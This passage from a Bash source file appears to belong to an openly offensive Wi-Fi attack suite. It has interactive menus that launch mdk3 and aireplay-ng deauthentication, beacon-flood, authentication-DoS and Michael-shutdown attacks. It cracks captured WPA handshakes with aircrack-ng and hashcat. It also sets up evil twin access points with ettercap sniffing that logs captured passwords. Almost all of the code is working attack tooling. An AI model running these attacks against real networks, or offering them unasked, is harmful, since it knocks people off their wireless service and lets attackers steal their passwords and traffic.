		language_strings ${language} 115 "read"
		return
	fi

	print_hint ${current_menu}

	read inet_iface
	if [ -z ${inet_iface} ]; then
		invalid_internet_iface_selected
		else if [[ ${inet_iface} < 1 ]] || [[ ${inet_iface} > ${option_counter} ]]; then
			invalid_internet_iface_selected
		else
			option_counter2=0
			for item2 in ${inet_ifaces}; do
				option_counter2=$[option_counter2 + 1]
				if [[ "$inet_iface" = "$option_counter2" ]]; then
					internet_interface=${item2}
					break;
				fi
			done
		fi
	fi
}

function select_interface() {

	clear
	language_strings ${language} 88 "title"
	current_menu="select_interface_menu"
	language_strings ${language} 24 "green"
	print_simple_separator
	ifaces=`ip link | egrep "^[0-9]+" | cut -d ':' -f 2 | awk {'print $1'} | grep lo -v`
	option_counter=0
	for item in ${ifaces}; do
		option_counter=$[option_counter + 1]
		if [ ${#option_counter} -eq 1 ]; then
			spaceiface="  "
		else
			spaceiface=" "
		fi
		set_chipset ${item}
		echo -ne "$option_counter.$spaceiface$item "
		if [ "$chipset" = "" ]; then
			language_strings ${language} 245 "blue"
		else
			echo -e ${blue_color}"// "${yellow_color}"Chipset:"${normal_color}" $chipset"
		fi
	done
	print_hint ${current_menu}

	read iface
	if [ -z ${iface} ]; then
		invalid_iface_selected
		else if [[ ${iface} < 1 ]] || [[ ${iface} > ${option_counter} ]]; then
			invalid_iface_selected
		else
			option_counter2=0
			for item2 in ${ifaces}; do
				option_counter2=$[option_counter2 + 1]
				if [[ "$iface" = "$option_counter2" ]]; then
					interface=${item2}
					break;
				fi
			done
		fi
	fi
}

function read_yesno() {

	echo
	language_strings ${language} $1 "green"
	read yesno
}

function ask_yesno() {

	yesno=""
	while [[ ! ${yesno} =~ ^[YyNn]$ ]]; do
		read_yesno $1
	done

	if [ "$yesno" = "Y" ]; then
		yesno="y"
	fi
	if [ "$yesno" = "N" ]; then
		yesno="n"
	fi
}

function read_channel() {

	echo
	language_strings ${language} 25 "green"
	read channel
}

function ask_channel() {

	while [[ ! ${channel} =~ ^([1-9]|1[0-4])$ ]]; do
		read_channel
	done
	echo
	language_strings ${language} 26 "blue"
}

function read_bssid() {

	echo
	language_strings ${language} 27 "green"
	read bssid
}

function ask_bssid() {

	while [[ ! ${bssid} =~ ^([a-fA-F0-9]{2}:){5}[a-zA-Z0-9]{2}$ ]]; do
		read_bssid
	done
	echo
	language_strings ${language} 28 "blue"
}

function read_essid() {

	echo
	language_strings ${language} 29 "green"
	read essid
}

function ask_essid() {

	if [ -z "$essid" ]; then
		read_essid
		else if [ "$essid" = "(Hidden Network)" ]; then
			echo
			language_strings ${language} 30 "yellow"
			read_essid
		fi
	fi

	echo
	language_strings ${language} 31 "blue"
}

function exec_mdk3deauth() {

	echo
	language_strings ${language} 89 "title"
	language_strings ${language} 32 "green"

	tmpfiles_toclean=1
	rm -rf ${tmpdir}"bl.txt" > /dev/null 2>&1
	echo ${bssid} > ${tmpdir}"bl.txt"

	echo
	language_strings ${language} 33 "blue"
	language_strings ${language} 4 "read"
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel} > /dev/null 2>&1
}

function exec_aireplaydeauth() {

	echo
	language_strings ${language} 90 "title"
	language_strings ${language} 32 "green"

	${airmon} start ${interface} ${channel} > /dev/null 2>&1

	echo
	language_strings ${language} 33 "blue"
	language_strings ${language} 4 "read"
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface} > /dev/null 2>&1
}

function exec_wdsconfusion() {

	echo
	language_strings ${language} 91 "title"
	language_strings ${language} 32 "green"

	echo
	language_strings ${language} 33 "blue"
	language_strings ${language} 4 "read"
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel} > /dev/null 2>&1
}

function exec_beaconflood() {

	echo
	language_strings ${language} 92 "title"
	language_strings ${language} 32 "green"

	echo
	language_strings ${language} 33 "blue"
	language_strings ${language} 4 "read"
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "beacon flood attack" -e mdk3 ${interface} b -n ${essid} -c ${channel} -s 1000 -h > /dev/null 2>&1
}

function exec_authdos() {

	echo
	language_strings ${language} 93 "title"
	language_strings ${language} 32 "green"

	echo
	language_strings ${language} 33 "blue"
	language_strings ${language} 4 "read"
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "auth dos attack" -e mdk3 ${interface} a -a ${bssid} -m -s 1024 > /dev/null 2>&1
}

function exec_michaelshutdown() {

	echo
	language_strings ${language} 94 "title"
	language_strings ${language} 32 "green"

	echo
	language_strings ${language} 33 "blue"
	language_strings ${language} 4 "read"
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "michael shutdown attack" -e mdk3 ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024 > /dev/null 2>&1
}

function mdk3_deauth_option() {

	echo
	language_strings ${language} 95 "title"
	language_strings ${language} 35 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings ${language} 34 "yellow"

	ask_bssid
	ask_channel
	exec_mdk3deauth
}

function aireplay_deauth_option() {

	echo
	language_strings ${language} 96 "title"
	language_strings ${language} 36 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings ${language} 34 "yellow"

	ask_bssid
	ask_channel
	exec_aireplaydeauth
}

function wds_confusion_option() {

	echo
	language_strings ${language} 97 "title"
	language_strings ${language} 37 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings ${language} 34 "yellow"

	ask_essid
	ask_channel
	exec_wdsconfusion
}

function beacon_flood_option() {

	echo
	language_strings ${language} 98 "title"
	language_strings ${language} 38 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings ${language} 34 "yellow"

	ask_essid
	ask_channel
	exec_beaconflood
}

function auth_dos_option() {

	echo
	language_strings ${language} 99 "title"
	language_strings ${language} 39 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings ${language} 34 "yellow"

	ask_bssid
	exec_authdos
}

function michael_shutdown_option() {

	echo
	language_strings ${language} 100 "title"
	language_strings ${language} 40 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings ${language} 34 "yellow"

	ask_bssid
	exec_michaelshutdown
}

function print_iface_selected() {

	if [ -z "$interface" ]; then
		language_strings ${language} 41 "blue"
		echo
		language_strings ${language} 115 "read"
		select_interface
	else
		check_interface_mode
		language_strings ${language} 42 "blue"
	fi
}

function print_iface_internet_selected() {

	if [ "$et_mode" != "et_captive_portal" ]; then
		if [ -z "$internet_interface" ]; then
			language_strings ${language} 283 "blue"
		else
			language_strings ${language} 282 "blue"
		fi
	fi
}

function print_all_target_vars() {

	if [ -n "$bssid" ]; then
		language_strings ${language} 43 "blue"
		if [ -n "$channel" ]; then
			language_strings ${language} 44 "blue"
		fi
		if [ -n "$essid" ]; then
			if [ "$essid" = "(Hidden Network)" ]; then
				language_strings ${language} 45 "blue"
			else
				language_strings ${language} 46 "blue"
			fi
		fi
		if [ -n "$enc" ]; then
			language_strings ${language} 135 "blue"
		fi
	fi
}

function print_all_target_vars_et() {

	if [ -n "$bssid" ]; then
		language_strings ${language} 43 "blue"
	else
		language_strings ${language} 271 "blue"
	fi

	if [ -n "$channel" ]; then
		language_strings ${language} 44 "blue"
	else
		language_strings ${language} 273 "blue"
	fi

	if [ -n "$essid" ]; then
		if [ "$essid" = "(Hidden Network)" ]; then
			language_strings ${language} 45 "blue"
		else
			language_strings ${language} 46 "blue"
		fi
	else
		language_strings ${language} 274 "blue"
	fi
}

function print_et_target_vars() {

	if [ -n "$bssid" ]; then
		language_strings ${language} 43 "blue"
	else
		language_strings ${language} 271 "blue"
	fi

	if [ -n "$channel" ]; then
		language_strings ${language} 44 "blue"
	else
		language_strings ${language} 273 "blue"
	fi

	if [ -n "$essid" ]; then
		if [ "$essid" = "(Hidden Network)" ]; then
			language_strings ${language} 45 "blue"
		else
			language_strings ${language} 46 "blue"
		fi
	else
		language_strings ${language} 274 "blue"
	fi

	if [ "$current_menu" != "et_dos_menu" ]; then
		if [ -n "$et_dos_attack" ]; then
			language_strings ${language} 272 "blue"
		else
			language_strings ${language} 278 "blue"
		fi
	fi

}

function print_decrypt_vars() {

	if [ -n "$bssid" ]; then
		language_strings ${language} 43 "blue"
	else
		language_strings ${language} 185 "blue"
	fi

	if [ -n "$enteredpath" ]; then
		language_strings ${language} 173 "blue"
	else
		language_strings ${language} 177 "blue"
	fi

	if [ -n "$dictionary" ]; then
		language_strings ${language} 182 "blue"
	fi

	if [ -n "$rules" ]; then
		language_strings ${language} 243 "blue"
	fi
}

function initialize_menu_options_dependencies() {

	clean_handshake_dependencies=(${optional_tools_names[0]})
	aircrack_attacks_dependencies=(${optional_tools_names[1]})
	aireplay_attack_dependencies=(${optional_tools_names[2]})
	mdk3_attack_dependencies=(${optional_tools_names[3]})
	hashcat_attacks_dependencies=(${optional_tools_names[4]})
	et_onlyap_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]})
	et_sniffing_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[8]} ${optional_tools_names[9]})
}

function initialize_menu_and_print_selections() {

	forbidden_options=()

	case ${current_menu} in
		"main_menu")
			print_iface_selected
		;;
		"decrypt_menu")
			print_decrypt_vars
		;;
		"handshake_tools_menu")
			print_iface_selected
			print_all_target_vars
		;;
		"dos_attacks_menu")
			print_iface_selected
			print_all_target_vars
		;;
		"attack_handshake_menu")
			print_iface_selected
			print_all_target_vars
		;;
		"language_menu")
			print_iface_selected
		;;
		"evil_twin_attacks_menu")
			return_to_et_main_menu=0
			et_mode=""
			et_processes=()
			print_iface_selected
			print_all_target_vars_et
			print_iface_internet_selected
		;;
		"et_dos_menu")
			print_iface_selected
			print_et_target_vars
			print_iface_internet_selected
		;;
		*)
			print_iface_selected
			print_all_target_vars
		;;
	esac
}

function clean_tmpfiles() {

	rm -rf ${tmpdir}"bl.txt" > /dev/null 2>&1
	rm -rf ${tmpdir}"handshake"* > /dev/null 2>&1
	rm -rf ${tmpdir}"nws"* > /dev/null 2>&1
	rm -rf ${tmpdir}"clts"* > /dev/null 2>&1
	rm -rf ${tmpdir}"wnws.txt" > /dev/null 2>&1
	rm -rf ${tmpdir}"hctmp"* > /dev/null 2>&1
	rm -rf "$tmpdir$hostapd_file" > /dev/null 2>&1
	rm -rf "$tmpdir$dhcpd_file" > /dev/null 2>&1
	rm -rf "$tmpdir$control_file" > /dev/null 2>&1
	rm -rf "${tmpdir}ag.ettercaplog"* > /dev/null 2>&1
	if [ ${dhcpd_path_changed} -eq 1 ]; then
		rm -rf "$dhcp_path" > /dev/null 2>&1
	fi
}

function clean_routing_rules() {

	echo "0" > /proc/sys/net/ipv4/ip_forward
	iptables -F
	iptables -t nat -F
	iptables -X
	iptables -t nat -X
}

function store_array() {

	local var=$1 base_key=$2 values=("${@:3}")
	for i in "${!values[@]}"; do
		eval "$1[\$base_key|${i}]=\${values[i]}"
	done
}

contains_element() {

	local e
	for e in "${@:2}"; do [[ "$e" == "$1" ]] && return 0; done
	return 1
}

function print_hint() {

	declare -A hints

	case ${1} in
		"main_menu")
			store_array hints main_hints "${main_hints[@]}"
			hintlength=${#main_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-${hintlength} -n 1)
			strtoprint=${hints[main_hints|$randomhint]}
		;;
		"dos_attacks_menu")
			store_array hints dos_hints "${dos_hints[@]}"
			hintlength=${#dos_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-${hintlength} -n 1)
			strtoprint=${hints[dos_hints|$randomhint]}
		;;
		"handshake_tools_menu")
			store_array hints handshake_hints "${handshake_hints[@]}"
			hintlength=${#handshake_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-${hintlength} -n 1)
			strtoprint=${hints[handshake_hints|$randomhint]}
		;;
		"attack_handshake_menu")
			store_array hints handshake_attack_hints "${handshake_attack_hints[@]}"
			hintlength=${#handshake_attack_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-${hintlength} -n 1)
			strtoprint=${hints[handshake_attack_hints|$randomhint]}
		;;
		"decrypt_menu")
			store_array hints decrypt_hints "${decrypt_hints[@]}"
			hintlength=${#decrypt_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-${hintlength} -n 1)
			strtoprint=${hints[decrypt_hints|$randomhint]}
		;;
		"select_interface_menu")
			store_array hints select_interface_hints "${select_interface_hints[@]}"
			hintlength=${#select_interface_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-${hintlength} -n 1)
			strtoprint=${hints[select_interface_hints|$randomhint]}
		;;
		"language_menu")
			store_array hints language_hints "${language_hints[@]}"
			hintlength=${#language_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-${hintlength} -n 1)
			strtoprint=${hints[language_hints|$randomhint]}
		;;
		"evil_twin_attacks_menu")
			store_array hints evil_twin_hints "${evil_twin_hints[@]}"
			hintlength=${#evil_twin_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-${hintlength} -n 1)
			strtoprint=${hints[evil_twin_hints|$randomhint]}
		;;
		"et_dos_menu")
			store_array hints evil_twin_dos_hints "${evil_twin_dos_hints[@]}"
			hintlength=${#evil_twin_dos_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-${hintlength} -n 1)
			strtoprint=${hints[evil_twin_dos_hints|$randomhint]}
		;;
	esac

	print_simple_separator
	language_strings ${language} ${strtoprint} "hint"
	print_simple_separator
}

function main_menu() {

	clear
	language_strings ${language} 101 "title"
	current_menu="main_menu"
	initialize_menu_and_print_selections
	echo
	language_strings ${language} 47 "green"
	print_simple_separator
	language_strings ${language} 48
	language_strings ${language} 55
	language_strings ${language} 56
	print_simple_separator
	language_strings ${language} 118
	language_strings ${language} 119
	language_strings ${language} 169
	language_strings ${language} 252
	print_simple_separator
	language_strings ${language} 60
	language_strings ${language} 78
	language_strings ${language} 61
	print_hint ${current_menu}

	read main_option
	case ${main_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			dos_attacks_menu
		;;
		5)
			handshake_tools_menu
		;;
		6)
			decrypt_menu
		;;
		7)
			evil_twin_attacks_menu
		;;
		8)
			credits_option
		;;
		9)
			language_menu
		;;
		10)
			exit_script_option
		;;
		*)
			invalid_menu_option
		;;
	esac

	main_menu
}

function evil_twin_attacks_menu() {

	clear
	language_strings ${language} 253 "title"
	current_menu="evil_twin_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings ${language} 47 "green"
	print_simple_separator
	language_strings ${language} 48
	language_strings ${language} 55
	language_strings ${language} 56
	language_strings ${language} 49
	language_strings ${language} 255 "separator"
	language_strings ${language} 256 et_onlyap_dependencies[@]
	language_strings ${language} 257 "separator"
	language_strings ${language} 259 et_sniffing_dependencies[@]
	language_strings ${language} 261 "under_construction"
	language_strings ${language} 262 "separator"
	language_strings ${language} 263 "under_construction"
	print_simple_separator
	language_strings ${language} 260
	print_hint ${current_menu}

	read et_option
	case ${et_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			explore_for_targets_option
		;;
		5)
			contains_element "$et_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				check_interface_wifi
				if [ "$?" = "0" ]; then
					et_mode="et_onlyap"
					et_dos_menu
				else
					echo
					language_strings ${language} 281 "yellow"
					language_strings ${language} 115 "read"
				fi
			fi
		;;
		6)
			contains_element "$et_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				check_interface_wifi
				if [ "$?" = "0" ]; then
					et_mode="et_sniffing"
					et_dos_menu
				else
					echo
					language_strings ${language} 281 "yellow"
					language_strings ${language} 115 "read"
				fi
			fi
		;;
		7)
			under_construction_message
			#TODO: Evil Twin AP with sniffing and sslstrip
			#contains_element "$et_option" "${forbidden_options[@]}"
			#if [ "$?" = "0" ]; then
			#	forbidden_menu_option
			#else
			#	check_interface_wifi
			#	if [ "$?" = "0" ]; then
			#		et_mode="et_sniffing_sslstrip"
			#		et_dos_menu
			#	else
			#		echo
			#		language_strings ${language} 281 "yellow"
			#		language_strings ${language} 115 "read"
			#	fi
			#fi
		;;
		8)
			under_construction_message
			#TODO: Evil Twin AP with captive portal
			#contains_element "$et_option" "${forbidden_options[@]}"
			#if [ "$?" = "0" ]; then
			#	forbidden_menu_option
			#else
			#	check_interface_wifi
			#	if [ "$?" = "0" ]; then
			#		et_mode="et_captive_portal"
			#		et_dos_menu
			#	else
			#		echo
			#		language_strings ${language} 281 "yellow"
			#		language_strings ${language} 115 "read"
			#	fi
			#fi
		;;
		9)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	evil_twin_attacks_menu
}

function decrypt_menu() {

	clear
	language_strings ${language} 170 "title"
	current_menu="decrypt_menu"
	initialize_menu_and_print_selections
	echo
	language_strings ${language} 47 "green"
	language_strings ${language} 176 "separator"
	language_strings ${language} 172
	language_strings ${language} 175 aircrack_attacks_dependencies[@]
	language_strings ${language} 229 "separator"
	language_strings ${language} 230 hashcat_attacks_dependencies[@]
	language_strings ${language} 231 hashcat_attacks_dependencies[@]
	language_strings ${language} 232 hashcat_attacks_dependencies[@]
	print_simple_separator
	language_strings ${language} 174
	print_hint ${current_menu}

	read decrypt_option
	case ${decrypt_option} in
		1)
			contains_element "$decrypt_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				aircrack_dictionary_attack_option
			fi
		;;
		2)
			contains_element "$decrypt_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				aircrack_bruteforce_attack_option
			fi
		;;
		3)
			contains_element "$decrypt_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				hashcat_dictionary_attack_option
			fi
		;;
		4)
			contains_element "$decrypt_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				hashcat_bruteforce_attack_option
			fi
		;;
		5)
			contains_element "$decrypt_option" "${forbidden_options[@]}"
			if [ "$?" = "0" ]; then
				forbidden_menu_option
			else
				hashcat_rulebased_attack_option
			fi
		;;
		6)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	decrypt_menu
}

function ask_rules() {

	validpath=1
	while [[ "$validpath" != "0" ]]; do
		read_path "rules"
	done
	language_strings ${language} 241 "yellow"
}

function ask_dictionary() {

	validpath=1
	while [[ "$validpath" != "0" ]]; do
		read_path "dictionary"
	done
	language_strings ${language} 181 "yellow"
}

function ask_capture_file() {

	validpath=1
	while [[ "$validpath" != "0" ]]; do
		read_path "targetfilefordecrypt"
	done
	language_strings ${language} 189 "yellow"
}

function manage_asking_for_captured_file() {

	if [ -n "$enteredpath" ]; then
		echo
		language_strings ${language} 186 "blue"
		ask_yesno 187
		if [ ${yesno} = "n" ]; then
			ask_capture_file
		fi
	else
		ask_capture_file
	fi
}

function manage_asking_for_dictionary_file() {

	if [ -n "$dictionary" ]; then
		echo
		language_strings ${language} 183 "blue"
		ask_yesno 184
		if [ ${yesno} = "n" ]; then
			ask_dictionary
		fi
	else
		ask_dictionary
	fi
}

function manage_asking_for_rule_file() {

	if [ -n "$rules" ]; then
		echo
		language_strings ${language} 239 "blue"
		ask_yesno 240
		if [ ${yesno} = "n" ]; then
			ask_rules
		fi
	else
		ask_rules
	fi
}

function check_valid_file_to_clean() {

	nets_from_file=$(echo "1" | aircrack-ng "$1" 2> /dev/null | egrep "WPA|WEP" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')

	if [ "$nets_from_file" = "" ]; then
		return 1
	fi

	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$[option_counter + 1]
		fi
	done

	if [ ${option_counter} -le 1 ]; then
		return 1
	fi

	handshakefilesize=`wc -c "$filetoclean" 2> /dev/null | awk -F " " '{print$1}'`
	if [ ${handshakefilesize} -le 1024 ]; then
		return 1
	fi

	echo "1" | aircrack-ng "$1" 2> /dev/null | egrep "1 handshake" > /dev/null
	if [ "$?" != "0" ]; then
		return 1
	fi

	return 0
}

function select_wpa_bssid_target_from_captured_file() {

	nets_from_file=$(echo "1" | aircrack-ng "$1" 2> /dev/null | egrep "WPA \([1-9][0-9]? handshake" | awk '{ saved = $1; $1 = ""; print substr($0, 2) }')

	echo
	if [ "$nets_from_file" = "" ]; then
		language_strings ${language} 216 "yellow"
		language_strings ${language} 115 "read"
		return 1
	fi

	declare -A bssids_detected
	option_counter=0
	for item in ${nets_from_file}; do
		if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then
			option_counter=$[option_counter + 1]
			bssids_detected["$option_counter"]=${item}
		fi
	done

	for targetbssid in ${bssids_detected[@]}; do
		if [ "$bssid" = "$targetbssid" ]; then
			language_strings ${language} 192 "blue"
			ask_yesno 193

			if [ ${yesno} = "y" ]; then
				bssid=${targetbssid}
				return 0
			fi
			break
		fi
	done

	bssid_autoselected=0
	if [ ${option_counter} -gt 1 ]; then
		option_counter=0
		for item in ${nets_from_file}; do
			if [[ ${item} =~ ^[0-9a-fA-F]{2}: ]]; then

				option_counter=$[option_counter + 1]

				if [ ${option_counter} -lt 10 ]; then
					space=" "
				else
					space=""
				fi

				echo -n "$option_counter.$space$item"
			elif [[ ${item} =~ \)$ ]]; then
				echo -en "$item\r\n"
			else
				echo -en " $item "
			fi
		done
		print_hint ${current_menu}

		target_network_on_file=0
		while [[ ${target_network_on_file} -lt 1 || ${target_network_on_file} -gt ${option_counter} ]]; do
			echo
			language_strings ${language} 3 "green"
			read target_network_on_file
		done

	else
		target_network_on_file=1
		bssid_autoselected=1
	fi

	bssid=${bssids_detected["$target_network_on_file"]}

	if [ ${bssid_autoselected} -eq 1 ]; then
		language_strings ${language} 217 "blue"
	fi

	return 0
}

function aircrack_dictionary_attack_option() {

	manage_asking_for_captured_file

	select_wpa_bssid_target_from_captured_file "$enteredpath"
	if [ "$?" != "0" ]; then
		return
	fi

	manage_asking_for_dictionary_file

	echo
	language_strings ${language} 190 "yellow"
	language_strings ${language} 115 "read"
	exec_aircrack_dictionary_attack
}

function aircrack_bruteforce_attack_option() {

	manage_asking_for_captured_file

	select_wpa_bssid_target_from_captured_file "$enteredpath"
	if [ "$?" != "0" ]; then
		return
	fi

	set_minlength_and_maxlength

	charset_option=0
	while [[ ${charset_option} -lt 1 || ${charset_option} -gt 11 ]]; do
		set_charset "aircrack"
	done

	echo
	language_strings ${language} 209 "blue"
	echo
	language_strings ${language} 190 "yellow"
	language_strings ${language} 115 "read"
	exec_aircrack_bruteforce_attack
}

function hashcat_dictionary_attack_option() {

	manage_asking_for_captured_file

	select_wpa_bssid_target_from_captured_file "$enteredpath"
	if [ "$?" != "0" ]; then
		return
	fi

	manage_asking_for_dictionary_file

	echo
	language_strings ${language} 190 "yellow"
	language_strings ${language} 115 "read"
	exec_hashcat_dictionary_attack
	manage_hashcat_pot
}

function hashcat_bruteforce_attack_option() {

	manage_asking_for_captured_file

	select_wpa_bssid_target_from_captured_file "$enteredpath"
	if [ "$?" != "0" ]; then
		return
	fi

	set_minlength_and_maxlength

	charset_option=0
	while [[ ${charset_option} -lt 1 || ${charset_option} -gt 5 ]]; do
		set_charset "hashcat"
	done

	echo
	language_strings ${language} 209 "blue"
	echo
	language_strings ${language} 190 "yellow"
	language_strings ${language} 115 "read"
	exec_hashcat_bruteforce_attack
	manage_hashcat_pot
}

function hashcat_rulebased_attack_option() {

	manage_asking_for_captured_file

	select_wpa_bssid_target_from_captured_file "$enteredpath"
	if [ "$?" != "0" ]; then
		return
	fi

	manage_asking_for_dictionary_file

	manage_asking_for_rule_file

	echo
	language_strings ${language} 190 "yellow"
	language_strings ${language} 115 "read"
	exec_hashcat_rulebased_attack
	manage_hashcat_pot
}

function manage_hashcat_pot() {

	if [[ ${hashcat_output} =~ "All hashes have been recovered" ]]; then

		echo
		language_strings ${language} 234 "yellow"
		ask_yesno 235
		if [ ${yesno} = "y" ]; then

			hashcat_potpath=`env | grep ^HOME | awk -F = '{print $2}'`
			lastcharhashcat_potpath=${hashcat_potpath: -1}
			if [ "$lastcharhashcat_potpath" != "/" ]; then
				hashcat_potpath="$hashcat_potpath/"
			fi
			hashcatpot_filename="hashcat-$bssid.pot"
			hashcat_potpath="$hashcat_potpath$hashcatpot_filename"

			validpath=1
			while [[ "$validpath" != "0" ]]; do
				read_path "hashcatpot"
			done

			cp ${tmpdir}"hctmp.pot" "$potenteredpath"
			echo
			language_strings ${language} 236 "blue"
			language_strings ${language} 115 "read"
		fi
	fi
}

function manage_ettercap_log() {

	ettercap_log=0
	ask_yesno 302
	if [ ${yesno} = "y" ]; then
		ettercap_log=1
		default_ettercap_logpath=`env | grep ^HOME | awk -F = '{print $2}'`
		lastcharettercaplogpath=${default_ettercap_logpath: -1}
		if [ "$lastcharettercaplogpath" != "/" ]; then
			ettercap_logpath="$default_ettercap_logpath/"
		fi
		default_ettercaplogfilename="evil_twin_captured_passwords-$essid.txt"
		rm -rf "${tmpdir}ag.ettercaplog"* > /dev/null 2>&1
		tmp_ettercaplog="${tmpdir}ag.ettercaplog"
		default_ettercap_logpath="$ettercap_logpath$default_ettercaplogfilename"
		validpath=1
		while [[ "$validpath" != "0" ]]; do
			read_path "ettercaplog"
		done
	fi
}

function set_minlength() {

	minlength=0
	while [[ ! ${minlength} =~ ^[8-9]$|^[1-5][0-9]$|^6[0-3]$ ]]; do
		echo
		language_strings ${language} 194 "green"
		read minlength
	done
}

function set_maxlength() {

	maxlength=0
	while [[ ! ${maxlength} =~ ^[8-9]$|^[1-5][0-9]$|^6[0-3]$ ]]; do
		echo
		language_strings ${language} 195 "green"
		read maxlength
	done
}

function set_minlength_and_maxlength() {

	set_minlength
	maxlength=0
	while [[ ${maxlength} -lt ${minlength} ]]; do
		set_maxlength
	done
}

function set_charset() {

	clear
	language_strings ${language} 238 "title"
	language_strings ${language} 196 "green"
	print_simple_separator
	language_strings ${language} 197
	language_strings ${language} 198
	language_strings ${language} 199
	language_strings ${language} 200

	case ${1} in
		"aircrack")
			language_strings ${language} 201
			language_strings ${language} 202
			language_strings ${language} 203
			language_strings ${language} 204
			language_strings ${language} 205
			language_strings ${language} 206
			language_strings ${language} 207
			print_hint ${current_menu}
			read charset_option
			case ${charset_option} in
				1)
					charset=${crunch_lowercasecharset}
				;;
				2)
					charset=${crunch_uppercasecharset}
				;;
				3)
					charset=${crunch_numbercharset}
				;;
				4)
					charset=${crunch_symbolcharset}
				;;
				5)
					charset="$crunch_lowercasecharset$crunch_uppercasecharset"
				;;
				6)
					charset="$crunch_lowercasecharset$crunch_numbercharset"
				;;
				7)
					charset="$crunch_uppercasecharset$crunch_numbercharset"
				;;
				8)
					charset="$crunch_symbolcharset$crunch_numbercharset"
				;;
				9)
					charset="$crunch_lowercasecharset$crunch_uppercasecharset$crunch_numbercharset"
				;;
				10)
					charset="$crunch_lowercasecharset$crunch_uppercasecharset$crunch_symbolcharset"
				;;
				11)
					charset="$crunch_lowercasecharset$crunch_uppercasecharset$crunch_numbercharset$crunch_symbolcharset"
				;;
			esac
		;;
		"hashcat")
			language_strings ${language} 237
			print_hint ${current_menu}
			read charset_option
			case ${charset_option} in
				1)
					charset="?l"
				;;
				2)
					charset="?u"
				;;
				3)
					charset="?d"
				;;
				4)
					charset="?s"
				;;
				5)
					charset="?a"
				;;
			esac

			charset_tmp=${charset}
			for ((i=0; i < $maxlength - 1; i++)); do
				charset+=${charset_tmp}
			done
		;;
	esac

	set_show_charset ${1}
}

function set_show_charset() {

	showcharset=""

	case ${1} in
		"aircrack")
			showcharset="$charset"
		;;
		"hashcat")
			case ${charset_tmp} in
				"?a")
					for item in ${hashcat_charsets[@]}; do
						showcharset+=$(hashcat --help | grep "$item =" | awk '{print $3}')
					done
				;;
				*)
					showcharset=$(hashcat --help | grep "$charset_tmp =" | awk '{print $3}')
				;;
			esac
		;;
	esac
}

function exec_aircrack_bruteforce_attack() {

	crunch ${minlength} ${maxlength} ${charset} | aircrack-ng -a 2 -b ${bssid} -w - "$enteredpath"
	language_strings ${language} 115 "read"
}

function exec_aircrack_dictionary_attack() {

	aircrack-ng -a 2 -b ${bssid} -w "$dictionary" "$enteredpath"
	language_strings ${language} 115 "read"
}

function exec_hashcat_dictionary_attack() {

	convert_cap_to_hashcat_format
	hashcat_output=$(hashcat -m 2500 -a 0 ${tmpdir}"hctmp.hccap" "$dictionary" --potfile-disable -o ${tmpdir}"hctmp.pot" | tee /dev/fd/5)
	language_strings ${language} 115 "read"
}

function exec_hashcat_bruteforce_attack() {

	convert_cap_to_hashcat_format
	hashcat_output=$(hashcat -m 2500 -a 3 ${tmpdir}"hctmp.hccap" ${charset} --potfile-disable -o ${tmpdir}"hctmp.pot" | tee /dev/fd/5)
	language_strings ${language} 115 "read"
}

function exec_hashcat_rulebased_attack() {

	convert_cap_to_hashcat_format
	hashcat_output=$(hashcat -m 2500 -a 0 ${tmpdir}"hctmp.hccap" "$dictionary" -r "$rules" --potfile-disable -o ${tmpdir}"hctmp.pot" | tee /dev/fd/5)
